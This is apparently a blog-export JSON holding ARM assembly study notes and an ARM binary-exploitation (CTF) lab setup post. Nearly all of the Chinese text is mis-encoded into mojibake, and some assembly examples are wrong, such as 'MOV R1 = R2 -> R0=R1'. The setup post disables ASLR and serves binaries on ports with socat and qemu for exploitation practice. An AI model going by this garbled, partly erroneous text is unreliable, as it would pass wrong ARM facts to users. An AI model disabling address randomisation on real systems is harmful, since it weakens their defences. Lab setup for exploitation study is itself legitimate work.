å¸¦ç¬¦å·æ•°å°äºæˆ–ç­‰äº 1110 AL å¿½ç•¥ æ— æ¡ä»¶æ‰§è¡Œ ç¨‹åºç»“æ„ Androidå¹³å°é‡‡ç”¨çš„æ˜¯GUN ARMæ±‡ç¼–æ ¼å¼ï¼Œæ±‡ç¼–å™¨ä¸ºGAS\nå‚æ•°ä¼ é€’ï¼šR0-R3è¿™4ä¸ªå¯„å­˜å™¨ç”¨æ¥ä¼ é€’å‡½æ•°è°ƒç”¨çš„ç¬¬1åˆ°4ä¸ªå‚æ•°ï¼Œè¶…å‡ºçš„å‚æ•°é€šè¿‡å †æ ˆæ¥ä¼ é€’ã€‚R0è¿˜ç”¨æ¥å­˜æ”¾å‡½æ•°è°ƒç”¨çš„è¿”å›å€¼ã€‚\næ±‡ç¼–å™¨æŒ‡ä»¤ .file:æºæ–‡ä»¶å\n.align:ä»£ç å¯¹é½æ–¹å¼\n.ascii:å£°æ˜å­—ç¬¦ä¸²\n.global:å£°æ˜å…¨å±€ç¬¦å·\n.typeï¼šæŒ‡å®šç¬¦å·çš„ç±»å‹\n.wordï¼šå­˜æ”¾åœ°å€å€¼\n.sizeï¼šè®¾ç½®æŒ‡å®šç¬¦å·çš„å¤§å°\n.identï¼šç¼–è¯‘å™¨æ ‡è¯†\nå¯»å€æ–¹å¼ ç«‹å³å¯»å€\nMOV R0, #1234 -\u0026gt;R0=1234\nå¯„å­˜å™¨å¯»å€\nMOV R1 = R2 -\u0026gt;R0=R1\nå¯„å­˜å™¨ç§»ä½å¯»å€\nLSL ï¼šé€»è¾‘å·¦ç§»ï¼Œç§»ä½åå¯„å­˜å™¨ç©ºå‡ºçš„ä½ä½è¡¥0\nLSRï¼šé€»è¾‘å³ç§»ï¼Œç§»ä½åå¯„å­˜å™¨ç©ºå‡ºçš„é«˜ä½è¡¥0\nASRï¼šç®—æœ¯å³ç§»ï¼Œç§»ä½è¿‡ç¨‹ä¸­ç¬¦å·ä½ä¿æŒä¸å˜ï¼Œè‹¥æºæ“ä½œæ•°ä¸ºæ­£æ•°ï¼Œåˆ™ç§»ä½åç©ºå‡ºçš„é«˜ä½è¡¥0ï¼Œå¦åˆ™è¡¥1ã€‚\nRORï¼šå¾ªç¯å³ç§»ï¼Œç§»ä½åç§»å‡ºçš„ä½ä½å¡«å…¥ç§»ä½ç©ºå‡ºçš„é«˜ä½ã€‚\nRRXï¼šå¸¦æ‰©å±•çš„å¾ªç¯å³ç§»ï¼Œæ“ä½œæ•°å³ç§»ä¸€ä½ï¼Œç§»å‡ºçš„ç©ºä½ç”¨Cæ ‡å¿—çš„å€¼å¡«å……ã€‚\nMOV R0, R1, LSL #2 -\u0026gt;R1å·¦ç§»ä¸¤ä½ï¼ˆR1\u0026laquo;2ï¼‰èµ‹å€¼ç»™R0,ç›¸å½“äºR0 = R1*4\nå¯„å­˜å™¨é—´æ¥å¯»å€\nLDR RO, [R1] -\u0026gt;å°†R1å¯„å­˜å™¨çš„æ•°å€¼ä½œä¸ºåœ°å€ï¼Œå–å‡ºæ­¤åœ°å€ä¸­çš„å€¼èµ‹ç»™R0å¯„å­˜å™¨\nåŸºå€å¯»å€\nå¤šç”¨äºæŸ¥è¡¨ã€æ•°ç»„è®¿é—®æ“ä½œã€‚\nLDR R0, [R1,#-4] -\u0026gt;å°†R1å¯„å­˜å™¨çš„æ•°å€¼å‡4ä½œä¸ºåœ°å€ï¼Œå–å‡ºæ­¤åœ°å€çš„å€¼èµ‹ç»™R0å¯„å­˜å™¨ã€‚\nå¤šå¯„å­˜å™¨å¯»å€\nä¸€æ¡æŒ‡ä»¤æœ€å¤šå®Œæˆ16ä¸ªé€šç”¨å¯„å­˜å™¨å€¼çš„ä¼ é€ã€‚\nLDMIA R0,{R1,R2,R3,R4} -\u0026gt;LDMä¸ºæ•°æ®åŠ è½½æŒ‡ä»¤ï¼ŒæŒ‡ä»¤çš„åç¼€IAè¡¨ç¤ºæ¯æ¬¡æ‰§è¡Œå®ŒåŠ è½½æ“ä½œåR0å¯„å­˜å™¨çš„å€¼è‡ªå¢1ä¸ªå­—ï¼ŒARMæŒ‡ä»¤é›†ä¸­ï¼Œå­è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ª32ä½æ•°å€¼ã€‚è¿™æ¡æŒ‡ä»¤ä½œç”¨ä¸ºï¼šR1 = [R0],R2 = [R0+#4],R3 = [R0+#8],R4 = [R0+#12]ã€‚\nå †æ ˆå¯»å€\nç‰¹å®šçš„æŒ‡ä»¤æ¥å®Œæˆï¼šLDMFA/STMFAã€LDMEA/STMEAã€LDMFD/STMFDã€LDMED/STMEDã€‚\nLDMå’ŒSTMä¸ºæŒ‡ä»¤å‰ç¼€ï¼Œè¡¨ç¤ºå¤šå¯„å­˜å™¨å¯»å€ï¼Œå³ä¸€æ¬¡ä¼ é€å¤šä¸ªå¯„å­˜å™¨çš„å€¼ã€‚åé¢çš„åç¼€ä¸ºæŒ‡ä»¤åç¼€ã€‚\nSTMFD SP!, {R1-R7,LR} -\u0026gt;å°†R1~R7,LRå…¥æ ˆï¼Œå¤šç”¨äºä¿å­˜å­ç¨‹åºçš„ç°åœºã€‚\nLDMFD SP!, {R1-R7,LR} -\u0026gt;å‡ºæ ˆï¼Œæ¢å¤ç°åœºã€‚\nå—æ‹·è´å¯»å€\nå®ç°ä»è¿ç»­åœ°å€æ•°æ®ä»å­˜å‚¨å™¨çš„æŸä¸€ä½ç½®æ‹·è´åˆ°å¦å¤–ä¸€ä¸ªä½ç½®ï¼ŒæŒ‡ä»¤æœ‰ï¼šLDMIA/STMIAã€LDMDA/STMDAã€LDMIB/STMIBã€LDMDB/STMDBã€‚\nLDMIA R0! {R0-R3} ä»R0å¯„å­˜å™¨æŒ‡å‘çš„å­˜å‚¨å•å…ƒä¸­è¯»å–3ä¸ªå­—åˆ°R1-R3å¯„å­˜å™¨\nSTMIA R0! {R0-R3} å­˜å‚¨ä»R1-R3å¯„å­˜å™¨çš„å†…å®¹åˆ°R0å¯„å­˜å™¨æŒ‡å‘çš„å­˜å‚¨å•å…ƒ\nç›¸å¯¹å¯»å€\nä»¥ç¨‹åºè®¡æ•°å™¨PCçš„å½“å‰å€¼ä¸ºåŸºåœ°å€ï¼ŒæŒ‡ä»¤ä¸­çš„åœ°å€æ ‡å·ä½œä¸ºåç§»é‡ï¼Œå°†ä¸¤è€…ç›¸åŠ ä¹‹åå¾—åˆ°æ“ä½œæ•°çš„æœ‰æ•ˆåœ°å€ã€‚\n1 BL NEXT Â·Â·Â·Â·NEXT: Â·Â·Â·Â·Â·Â·Â·Â· ARMå’ŒThumbæŒ‡ä»¤é›† åŸºæœ¬æŒ‡ä»¤ç®€è¿° MNEMONIC{S}{condition}Â {Rd},Â Operand1,Â Operand2\nåŠ©è®°ç¬¦{æ˜¯å¦ä½¿ç”¨CPSR}{æ˜¯å¦æ¡ä»¶æ‰§è¡Œä»¥åŠæ¡ä»¶}Â {ç›®çš„å¯„å­˜å™¨},Â æ“ä½œç¬¦1,Â æ“ä½œç¬¦2\nMNEMONICÂ -Â æŒ‡ä»¤çš„åŠ©è®°ç¬¦å¦‚ADD\n{S}Â -Â å¯é€‰çš„æ‰©å±•ä½ï¼Œå¦‚æœæŒ‡ä»¤ååŠ äº†Sï¼Œåˆ™éœ€è¦ä¾æ®è®¡ç®—ç»“æœæ›´æ–°CPSRå¯„å­˜å™¨ä¸­çš„æ¡ä»¶è·³è½¬ç›¸å…³ çš„FLAG {condition}Â -Â å¦‚æœæœºå™¨ç è¦è¢«æ¡ä»¶æ‰§è¡Œï¼Œé‚£å®ƒéœ€è¦æ»¡è¶³çš„æ¡ä»¶æ ‡ç¤º {Rd}Â -Â å­˜å‚¨ç»“æœçš„ç›®çš„å¯„å­˜å™¨ Operand1Â -Â ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œå¯„å­˜å™¨æˆ–è€…æ˜¯ä¸€ä¸ªç«‹å³æ•° Operand2Â -Â ç¬¬äºŒä¸ª(å¯å˜çš„)æ“ä½œæ•°ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªç«‹å³æ•°æˆ–è€…å¯„å­˜å™¨æˆ–è€…æœ‰åç§»é‡çš„å¯„å­˜å™¨ ç¬¬äºŒæ“ä½œæ•°è¿˜æœ‰å¦‚ä¸‹æ“ä½œï¼š\n1 2 3 4 5 6 7 #123 - ç«‹å³æ•° Rx - å¯„å­˜å™¨æ¯”å¦‚R1 Rx, ASR n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œç®—æœ¯å³ç§»nä½åçš„å€¼ Rx, LSL n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œé€»è¾‘å·¦ç§»nä½åçš„å€¼ Rx, LSR n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œé€»è¾‘å³ç§»nä½åçš„å€¼ Rx, ROR n - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œå¾ªç¯å³ç§»nä½åçš„å€¼ Rx, RRX - å¯¹å¯„å­˜å™¨ä¸­çš„å€¼è¿›è¡Œå¸¦æ‰©å±•çš„å¾ªç¯å³ç§»1ä½åçš„å€¼ 1 2 3 4 ADD R0, R1, R2 - å°†ç¬¬ä¸€æ“ä½œæ•°R1çš„å†…å®¹ä¸ç¬¬äºŒæ“ä½œæ•°R2çš„å†…å®¹ç›¸åŠ ï¼Œå°†ç»“æœå­˜å‚¨åˆ°R0ä¸­ã€‚ ADD R0, R1, #2 - å°†ç¬¬ä¸€æ“ä½œæ•°R1çš„å†…å®¹ä¸ç¬¬äºŒæ“ä½œæ•°ä¸€ä¸ªç«‹å³æ•°ç›¸åŠ ï¼Œå°†ç»“æœå­˜åˆ°R0ä¸­ MOVLE R0, #5 - å½“æ»¡è¶³æ¡ä»¶LE(Less and Equal,å°äºç­‰äº0)å°†ç¬¬äºŒæ“ä½œæ•°ç«‹å³æ•°5ç§»åŠ¨åˆ°R0ä¸­,æ³¨æ„è¿™æ¡æŒ‡ä»¤ä¸MOVLE R0, R0, #5ç›¸åŒ MOV R0, R1, LSL #1 - å°†ç¬¬äºŒæ“ä½œæ•°R1å¯„å­˜å™¨ä¸­çš„å€¼é€»è¾‘å·¦ç§»1ä½åå­˜å…¥R0 å†…å­˜è®¿é—®ç›¸å…³æŒ‡ä»¤ é€šå¸¸ï¼ŒLDRè¢«ç”¨æ¥ä»å†…å­˜ä¸­åŠ è½½æ•°æ®åˆ°å¯„å­˜å™¨ï¼ŒSTRè¢«ç”¨ä½œå°†å¯„å­˜å™¨çš„å€¼å­˜æ”¾åˆ°å†…å­˜ä¸­ã€‚\nä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 .data /* æ•°æ®æ®µæ˜¯åœ¨å†…å­˜ä¸­åŠ¨æ€åˆ›å»ºçš„ï¼Œæ‰€ä»¥å®ƒçš„åœ¨å†…å­˜ä¸­çš„åœ°å€ä¸å¯é¢„æµ‹*/ var1: .word 3 /* å†…å­˜ä¸­çš„ç¬¬ä¸€ä¸ªå˜é‡ */ var2: .word 4 /* å†…å­˜ä¸­çš„ç¬¬äºŒä¸ªå˜é‡ */ .text /* ä»£ç æ®µå¼€å§‹ */ .global _start _start: ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­ ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­ ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­ str r2, [r1] @ å°†R2ä¸­çš„å€¼0x3å­˜æ”¾åˆ°R1åšæŒ‡å‘çš„åœ°å€ bkpt adr_var1: .word var1 /* var1çš„åœ°å€åŠ©è®°ç¬¦ */ adr_var2: .word var2 /* var2çš„åœ°å€åŠ©è®°ç¬¦ */ ç¬¬ä¸€ç§åç§»å½¢å¼ï¼šç«‹å³æ•°ä½œåç§»\n1 2 STR Ra, [Rb, imm] LDR Ra, [Rc, imm] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­ ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­ ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­ str r2, [r1, #2] @ å–å€æ¨¡å¼ï¼šåŸºäºåç§»é‡ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ 2æ‰€æŒ‡å‘åœ°å€å¤„ã€‚ str r2, [r1, #4]! @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•å‰ç½®ä¿®æ”¹ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ 4æ‰€æŒ‡å‘åœ°å€å¤„ï¼Œä¹‹åR1å¯„å­˜å™¨ä¸­å­˜å‚¨çš„å€¼åŠ 4,ä¹Ÿå°±æ˜¯R1=R1+4ã€‚ ldr r3, [r1], #4 @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•åç½®ä¿®æ”¹ã€‚R3å¯„å­˜å™¨ä¸­çš„å€¼æ˜¯ä»R1å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­åŠ è½½çš„ï¼ŒåŠ è½½ä¹‹åR1å¯„å­˜å™¨ä¸­å­˜å‚¨çš„å€¼åŠ 4,ä¹Ÿå°±æ˜¯R1=R1+4ã€‚ bkpt adr_var1: .word var1 adr_var2: .word var2 ç¬¬äºŒç§åç§»å½¢å¼ï¼šå¯„å­˜å™¨ä½œåç§»\n1 2 STR Ra, [Rb, Rc] LDR Ra, [Rb, Rc] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­ ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­ ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­ str r2, [r1, r2] @ å–å€æ¨¡å¼ï¼šåŸºäºåç§»é‡ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ R2å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘åœ°å€å¤„ã€‚R1å¯„å­˜å™¨ä¸ä¼šè¢«ä¿®æ”¹ã€‚ str r2, [r1, r2]! @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•å‰ç½®ä¿®æ”¹ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ R2å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘åœ°å€å¤„ï¼Œä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°,ä¹Ÿå°±æ˜¯R1=R1+R2ã€‚ ldr r3, [r1], r2 @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•åç½®ä¿®æ”¹ã€‚R3å¯„å­˜å™¨ä¸­çš„å€¼æ˜¯ä»R1å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­åŠ è½½çš„ï¼ŒåŠ è½½ä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°ä¹Ÿå°±æ˜¯R1=R1+R2ã€‚ bx lr adr_var1: .word var1 ç¬¬ä¸‰ç§åç§»å½¢å¼ï¼šå¯„å­˜å™¨ç¼©æ”¾å€¼ä½œåç§»\n1 2 LDR Ra, [Rb, Rc, \u0026lt;shifter\u0026gt;] STR Ra, [Rb, Rc, \u0026lt;shifter\u0026gt;] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .data var1: .word 3 var2: .word 4 .text .global _start _start: ldr r0, adr_var1 @ å°†å­˜æ”¾var1å€¼çš„åœ°å€adr_var1åŠ è½½åˆ°å¯„å­˜å™¨R0ä¸­ ldr r1, adr_var2 @ å°†å­˜æ”¾var2å€¼çš„åœ°å€adr_var2åŠ è½½åˆ°å¯„å­˜å™¨R1ä¸­ ldr r2, [r0] @ å°†R0æ‰€æŒ‡å‘åœ°å€ä¸­å­˜æ”¾çš„0x3åŠ è½½åˆ°å¯„å­˜å™¨R2ä¸­ str r2, [r1, r2, LSL#2] @ å–å€æ¨¡å¼ï¼šåŸºäºåç§»é‡ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ (å·¦ç§»ä¸¤ä½åçš„R2å¯„å­˜å™¨çš„å€¼)æ‰€æŒ‡å‘åœ°å€å¤„ã€‚R1å¯„å­˜å™¨ä¸ä¼šè¢«ä¿®æ”¹ã€‚ str r2, [r1, r2, LSL#2]! @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•å‰ç½®ä¿®æ”¹ã€‚R2å¯„å­˜å™¨ä¸­çš„å€¼0x3è¢«å­˜æ”¾åˆ°R1å¯„å­˜å™¨çš„å€¼åŠ (å·¦ç§»ä¸¤ä½åçš„R2å¯„å­˜å™¨çš„å€¼)æ‰€æŒ‡å‘åœ°å€å¤„ï¼Œä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°,ä¹Ÿå°±R1 = R1 + R2\u0026lt;\u0026lt;2ã€‚ ldr r3, [r1], r2, LSL#2 @ å–å€æ¨¡å¼ï¼šåŸºäºç´¢å¼•åç½®ä¿®æ”¹ã€‚R3å¯„å­˜å™¨ä¸­çš„å€¼æ˜¯ä»R1å¯„å­˜å™¨çš„å€¼æ‰€æŒ‡å‘çš„åœ°å€ä¸­åŠ è½½çš„ï¼ŒåŠ è½½ä¹‹åR1å¯„å­˜å™¨ä¸­çš„å€¼è¢«æ›´æ–°ä¹Ÿå°±æ˜¯R1 = R1 + R2\u0026lt;\u0026lt;2ã€‚ bkpt adr_var1: .word var1 adr_var2: .word var2 å¦‚ä½•åŒºåˆ†å–å€æ¨¡å¼ï¼š\nå¦‚æœæœ‰ä¸€ä¸ªå¹å·!ï¼Œé‚£å°±æ˜¯ç´¢å¼•å‰ç½®å–å€æ¨¡å¼ï¼Œå³ä½¿ç”¨è®¡ç®—åçš„åœ°å€ï¼Œä¹‹åæ›´æ–°åŸºå€å¯„å­˜å™¨ã€‚\nå¦‚æœåœ¨å¤–æœ‰ä¸€ä¸ªå¯„å­˜å™¨ï¼Œé‚£å°±æ˜¯ç´¢å¼•åç½®å–å€æ¨¡å¼ï¼Œå³ä½¿ç”¨åŸæœ‰åŸºå€å¯„å­˜å™¨é‡çš„åœ°å€ï¼Œä¹‹åå†æ›´æ–°åŸºå€å¯„å­˜å™¨\né™¤æ­¤ä¹‹å¤–ï¼Œå°±éƒ½æ˜¯åç§»å–å€æ¨¡å¼äº†\nå…³äºPCç›¸å¯¹å–å€çš„LDRæŒ‡ä»¤\næœ‰æ—¶å€™LDRå¹¶ä¸ä»…ä»…è¢«ç”¨æ¥ä»å†…å­˜ä¸­åŠ è½½æ•°æ®ã€‚è¿˜æœ‰å¦‚ä¸‹è¿™æ“ä½œ:\n1 2 3 4 5 6 7 8 .section .text .global _start _start: ldr r0, =jump /* åŠ è½½jumpæ ‡ç­¾æ‰€åœ¨çš„å†…å­˜ä½ç½®åˆ°R0 */ ldr r1, =0x68DB00AD /* åŠ è½½ç«‹å³æ•°0x68DB00ADåˆ°R1 */ jump: ldr r2, =511 /* åŠ è½½ç«‹å³æ•°511åˆ°R2 */ bkpt è¿™äº›æŒ‡ä»¤å­¦æœ¯ä¸Šè¢«ç§°ä½œä¼ªæŒ‡ä»¤ã€‚\nåœ¨ARMä¸­ä½¿ç”¨ç«‹å³æ•°çš„è§„å¾‹\nåœ¨ARMä¸­ä¸èƒ½åƒX86é‚£æ ·ç›´æ¥å°†ç«‹å³æ•°åŠ è½½åˆ°å¯„å­˜å™¨ä¸­ã€‚å› ä¸ºä½ ä½¿ç”¨çš„ç«‹å³æ•°æ˜¯å—é™çš„ã€‚\nç«‹å³æ•°çš„å€¼ï¼šv = n ror 2*r æœ‰æ•ˆçš„ç«‹å³æ•°éƒ½å¯ä»¥é€šè¿‡å¾ªç¯å³ç§»æ¥å¾—åˆ°\n1 2 3 4 5 6 7 8 9 10 #256 // 1 å¾ªç¯å³ç§» 24ä½ --\u0026gt; 256 #384 // 6 å¾ªç¯å³ç§» 26ä½ --\u0026gt; 384 #484 // 121 å¾ªç¯å³ç§» 30ä½ --\u0026gt; 484 #16384 // 1 å¾ªç¯å³ç§» 18ä½ --\u0026gt; 16384 #2030043136 // 121 å¾ªç¯å³ç§» 8ä½ --\u0026gt; 2030043136 #0x06000000 // 6 å¾ªç¯å³ç§» 8ä½ --\u0026gt; 100663296 (åå…­è¿›åˆ¶å€¼0x06000000) Invalid values: #370 // 185 å¾ªç¯å³ç§» 31ä½ --\u0026gt; 31ä¸åœ¨èŒƒå›´å†… (0 â€“ 30) #511 // 1 1111 1111 --\u0026gt; æ¯”ç‰¹æ¨¡å‹ä¸ç¬¦åˆ #0x06010000 // 1 1000 0001.. --\u0026gt; æ¯”ç‰¹æ¨¡å‹ä¸ç¬¦åˆ è¿™æ ·å¹¶ä¸èƒ½ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰çš„32ä½å€¼ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„ä¸¤ä¸ªé€‰é¡¹æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼š\nç”¨å°éƒ¨åˆ†å»ç»„æˆæ›´å¤§çš„å€¼ã€‚Â MOV r0, #511 å°†511åˆ†æˆä¸¤éƒ¨åˆ†ï¼šMOV r0, #256, and ADD r0, #255 1 2 3 4 5 6 7 .section .text .global _start _start: mov r0, #256 /* 1 ror 24 = 256, so it\u0026#39;s valid */ add r0, #255 /* 255 ror 0 = 255, valid. r0 = 256 + 255 = 511 */ ldr r1, =511 /* load 511 from the literal pool using LDR */ bkpt è®¡ç®—ç«‹å³æ•°çš„æœ‰æ•ˆå€¼è„šæœ¬ï¼šhttps://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py\n1 2 3 4 5 6 7 azeria@labs:~$ python rotator.py Enter the value you want to check: 511 Sorry, 511 cannot be used as an immediate number and has to be split. azeria@labs:~$ python rotator.py Enter the value you want to check: 256 The number 256 can be used as a valid immediate number. 1 ror 24 --\u0026gt; 256 ä¸‹é¢çš„éƒ¨åˆ†æŒ‡ä»¤ç”¨åˆ°åœ¨è¯¦ç»†æŸ¥ï¼Œè®°çš„è¯è„‘å£³ç—›\nè·³è½¬æŒ‡ä»¤ B\nBL\nBX\nBXL\nå­˜å‚¨å™¨æ“ä½œæŒ‡ä»¤ LDM\nSTM\nPUSH\nPOP\nSWP\næ•°æ®å¤„ç† MOV\nMVN\nADD\nADC\nSUB\nRSB\nSBC\nRSC\nMUL\nMLS\nMLA\nUMULL\nUMLAL\nSMUULL\nSMLAL\nSMLAD\nSMLSD\nSDIV\nUDIV\nASR\nAND\nORR\nEOR\nBIC\nLSL\nLSR\nRRX\nROR\nCMP\nCMN\nTSL\nTEQ\nå…¶ä»–æŒ‡ä»¤ SWI\nNOP\nMRS\nMSR\n","date":"2019-08-10T00:00:00+08:00","permalink":"https://ykiko.top/p/arm%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%BE%85%E8%A1%A5%E5%85%85/","title":"ARMæ±‡ç¼–åŸºç¡€(å¾…è¡¥å……)"},{"content":"ARM-PWNä»å…¥é—¨åˆ°æ”¾å¼ƒ0x00-ç¯å¢ƒå‡†å¤‡ 0x00 å‰è¨€ å­¦PWNä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œx86/x86_64 ä¸‹ç®—æ˜¯å…¥äº†ä¸ªé—¨ï¼Œå¹³æ—¶æ¥è§¦ARMæ¯”è¾ƒå¤šï¼Œæ­£å¥½ä»¥ARMæ¶æ„ä¸‹å†æ›´åŠ æ·±å…¥çš„å­¦ä¹ PWNã€‚\nä¼šç”¨çš„å·¥å…·ã€ç¯å¢ƒï¼š\nåœ¨Ubuntu 18.04/WSL2\nDocker for wsl2\næ ‘è“æ´¾3B+\nqemu\nunicorn\nIDA\nRadare2\nGDB+gef+pwndbg+peda\npwntools\n0x01 ç¯å¢ƒå®‰è£… è¿™é‡Œé€‰ç”¨çš„æœ‰ä¸¤ç§ç¯å¢ƒ\nARMè®¾å¤‡ æ ‘è“æ´¾\nä¹‹å‰618ä¹°äº†æ ‘è“æ´¾ï¼Œæ´¾ä¸Šç”¨åœºäº†ã€‚\næŠŠPIçš„å®˜æ–¹ç³»ç»Ÿæ¢æˆäº†Ubuntu 18.04ã€‚\nå®‰è£…äº†GCC ã€gdbã€gefï¼ˆç»æµ‹è¯•åªæœ‰gefèƒ½ç”¨ï¼‰ï¼Œå…¶ä»–ä¹Ÿæ²¡ä»€ä¹ˆéœ€è¦è£…çš„ã€‚\nå…³é—­åœ°å€éšæœºåŒ–\n1 2 3 4 5 6 7 8 sudo cat /proc/sys/kernel/randomize_va_space # çŠ¶æ€æŸ¥çœ‹ 2 # å¼€å¯ä¸­ sudo echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space bash: /proc/sys/kernel/randomize_va_space: Permission denied su echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space cat /proc/sys/kernel/randomize_va_space 0 #è¿™å°±OK QEMU æ¨¡æ‹Ÿ (WSL2)\nå®‰è£…\n1 2 3 4 #é˜²æ­¢åˆå‡ºä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿçš„é”™è¯¯å’Œéœ€æ±‚ï¼Œå°½é‡éƒ½è£…ä¸Š apt install gdb gdb-multiarch ## apt install qemu ## apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu ##gcc arm ä¾èµ–åº“å®‰è£… 0x02 å¯åŠ¨å’Œè°ƒè¯• æ ‘è“æ´¾\nç›´æ¥è¿è¡Œ\nè¿›è¡Œsocatç»‘å®šç«¯å£ å°±OK\n1 socat tcp-listen:6666,fork exec:./binfile QEMU\n32bit 1 2 3 4 5 6 7 8 # æœ¬åœ°GDBè°ƒè¯• qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./binfile gdb-multiarch target remote localhost:1234 # ç»‘å®šè¿è¡Œåˆ°æŒ‡å®šç«¯å£ è¿œç¨‹è°ƒè¯• socat tcp-l:10002,fork exec:\u0026#34;qemu-arm -L /usr/arm-linux-gnueabi ./binfile\u0026#34;,reuseaddr \u0026amp; # + -g æ–¹ä¾¿è°ƒè¯• socat tcp-l:10002,fork exec:\u0026#34;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./binfile\u0026#34;,reuseaddr \u0026amp; 64bit 1 2 3 4 # æœ¬åœ°è°ƒè¯• -g ç­‰å¾…GDBè°ƒè¯• qemu-aarch64 -g 1111 -L /usr/aarch64-linux-gnu ./file socat tcp-l:10002,fork exec:\u0026#34;qemu-aarch64 -L /usr/aarch64-linux-gnu ./binfile\u0026#34;,reuseaddr \u0026amp; socat tcp-l:10002,fork exec:\u0026#34;qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./binfile\u0026#34;,reuseaddr \u0026amp; 0x03 è°ƒè¯•è¿‡ç¨‹ åœ¨æ ‘è“æ´¾ç›´æ¥gdbè°ƒè¯•å°±è¡Œã€‚çœç•¥ã€‚ã€‚ã€‚\nimg\nä½¿ç”¨qemu+gdb-multiarch+æ’ä»¶è¿›è¡Œè°ƒè¯•æ­¥éª¤\nqemu-aarch64 -g 10002 -L /usr/aarch64-linux-gnu ./baby_arm\n1 2 gdb-multiarch ./baby_arm -q target remote:10002 0x04 é¢˜ç›®æ­å»º åŸºäºctf_xinetdé¡¹ç›®è‡ªå·±æ”¹äº†ä¸€ä¸ª\nåœ°å€ï¼šCTF_ARM_xinetd\n0x05 å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/3154\nhttps://github.com/Eadom/ctf_xinetd\nhttps://github.com/bkerler/exploit_me\n","date":"2019-08-03T00:00:00+08:00","permalink":"https://ykiko.top/p/arm-pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%830x00-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/","title":"ARM-PWNä»å…¥é—¨åˆ°æ”¾å¼ƒ0x00-ç¯å¢ƒå‡†å¤‡"},{"content":"Raspberry_Pi_3B+_0å®‰è£…ä½¿ç”¨ Raspberry Pi 3B+ 0å®‰è£…ä½¿ç”¨ 0x00 è´­ä¹° 